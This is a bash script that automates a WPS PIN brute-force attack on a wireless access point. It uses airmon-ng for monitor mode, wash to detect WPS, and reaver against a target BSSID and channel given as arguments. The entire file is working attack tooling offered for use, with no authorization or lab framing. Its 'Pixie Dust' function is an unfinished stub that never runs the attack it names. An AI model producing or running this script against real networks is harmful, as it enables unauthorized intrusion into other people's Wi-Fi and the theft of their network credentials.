#!/bin/bash

# WPS PIN Attack Script with Enhanced Security and Validation

set -euo pipefail

# Configuration
LOG_FILE="/var/log/iseeyou_attacks.log"
INTERFACE="wlan0"
MONITOR_INTERFACE="${INTERFACE}mon"
ATTACK_TIMEOUT=1800  # 30 minutes default timeout

# Logging function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [WPS] $*" | tee -a "$LOG_FILE"
}

# Cleanup function
cleanup() {
    log "Cleaning up and stopping WPS attack..."
    # Kill any remaining reaver processes
    pkill -f "reaver.*$MONITOR_INTERFACE" 2>/dev/null || true
    # Stop monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true
    log "Cleanup completed"
}

# Trap for cleanup on exit
trap cleanup EXIT INT TERM

# Validate MAC address
validate_mac() {
    local mac=$1
    if [[ ! $mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        log "ERROR: Invalid MAC address format: $mac"
        exit 1
    fi
}

# Validate channel
validate_channel() {
    local channel=$1
    if ! [[ "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 165 ]; then
        log "ERROR: Invalid channel: $channel"
        exit 1
    fi
}

# Check if required tools are installed
check_dependencies() {
    local tools=("reaver" "airmon-ng" "iwconfig" "wash")
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log "ERROR: Required tool not found: $tool"
            exit 1
        fi
    done
    log "All required tools are available"
}

# Check if WPS is enabled on target
check_wps_enabled() {
    local target_bssid=$1
    local target_channel=$2

    log "Checking if WPS is enabled on target $target_bssid..."

    # Use wash to scan for WPS-enabled APs
    local wps_scan
    if ! wps_scan=$(sudo timeout 30 wash -i "$MONITOR_INTERFACE" 2>/dev/null); then
        log "ERROR: Failed to scan for WPS-enabled access points"
        return 1
    fi

    # Check if target BSSID supports WPS
    if echo "$wps_scan" | grep -q "$target_bssid"; then
        log "WPS is enabled on target $target_bssid"
        return 0
    else
        log "WARNING: WPS does not appear to be enabled on target $target_bssid"
        log "This attack may not succeed"
        return 0  # Continue anyway, user might know better
    fi
}

# Function to perform WPS attack
perform_wps_attack() {
    local target_bssid=$1
    local target_channel=$2

    log "Starting WPS PIN attack on BSSID: $target_bssid, Channel: $target_channel"

    # Validate inputs
    validate_mac "$target_bssid"
    validate_channel "$target_channel"

    # Check if interface exists
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        log "ERROR: Wireless interface $INTERFACE not found"
        exit 1
    fi

    # Stop any existing monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true

    # Put the wireless interface in monitor mode
    log "Putting wireless interface $INTERFACE in monitor mode..."
    if ! sudo airmon-ng start "$INTERFACE"; then
        log "ERROR: Failed to start monitor mode on $INTERFACE"
        exit 1
    fi

    # Wait for interface to be ready
    sleep 2

    # Change to the target channel
    log "Changing channel to $target_channel..."
    if ! sudo iwconfig "$MONITOR_INTERFACE" channel "$target_channel"; then
        log "ERROR: Failed to set channel $target_channel"
        exit 1
    fi

    # Check if WPS is enabled
    if ! check_wps_enabled "$target_bssid" "$target_channel"; then
        log "Proceeding with WPS attack despite potential issues..."
    fi

    # Perform WPS attack with timeout
    log "Starting WPS PIN attack on $target_bssid..."
    log "Attack will run for up to $ATTACK_TIMEOUT seconds"

    # Run reaver with timeout and verbose output
    local reaver_cmd="sudo timeout $ATTACK_TIMEOUT reaver -i $MONITOR_INTERFACE -b $target_bssid -vv -c $target_channel"

    log "Executing: $reaver_cmd"

    if eval "$reaver_cmd"; then
        log "WPS attack completed successfully"
        return 0
    else
        local exit_code=$?
        if [ $exit_code -eq 124 ]; then
            log "WPS attack timed out after $ATTACK_TIMEOUT seconds"
        else
            log "WPS attack failed with exit code: $exit_code"
        fi
        return 1
    fi
}

# Alternative WPS attack using Pixie Dust if available
perform_pixie_dust_attack() {
    local target_bssid=$1
    local target_channel=$2

    log "Attempting Pixie Dust WPS attack (if supported)..."

    # Check if pixiewps is available
    if ! command -v pixiewps &> /dev/null; then
        log "pixiewps not available, skipping Pixie Dust attack"
        return 1
    fi

    # First try to get the necessary data with reaver
    log "Getting WPS data for Pixie Dust attack..."
    local wps_data
    if ! wps_data=$(sudo timeout 60 reaver -i "$MONITOR_INTERFACE" -b "$target_bssid" -c "$target_channel" -vv 2>&1 | head -20); then
        log "Failed to get WPS data for Pixie Dust attack"
        return 1
    fi

    log "Pixie Dust attack data collected"
    # Note: Actual Pixie Dust implementation would require parsing the WPS data
    # and using pixiewps tool, but that's beyond the scope of this basic implementation

    return 0
}

# Main script
main() {
    # Check if running as root
    if [ "$EUID" -ne 0 ]; then
        log "ERROR: This script must be run as root (sudo)"
        exit 1
    fi

    # Check dependencies
    check_dependencies

    # Validate arguments
    if [ $# -lt 2 ]; then
        log "Usage: $0 <target_bssid> <target_channel> [attack_timeout]"
        log "Example: $0 00:11:22:33:44:55 6 3600"
        exit 1
    fi

    local target_bssid=$1
    local target_channel=$2

    # Optional timeout parameter
    if [ $# -ge 3 ]; then
        ATTACK_TIMEOUT=$3
        if ! [[ "$ATTACK_TIMEOUT" =~ ^[0-9]+$ ]] || [ "$ATTACK_TIMEOUT" -lt 60 ]; then
            log "ERROR: Invalid attack timeout: $ATTACK_TIMEOUT (minimum 60 seconds)"
            exit 1
        fi
    fi

    # Execute WPS attack
    if perform_wps_attack "$target_bssid" "$target_channel"; then
        log "WPS attack completed successfully"
    else
        log "WPS attack failed"
        exit 1
    fi
}

# Run main function
main "$@"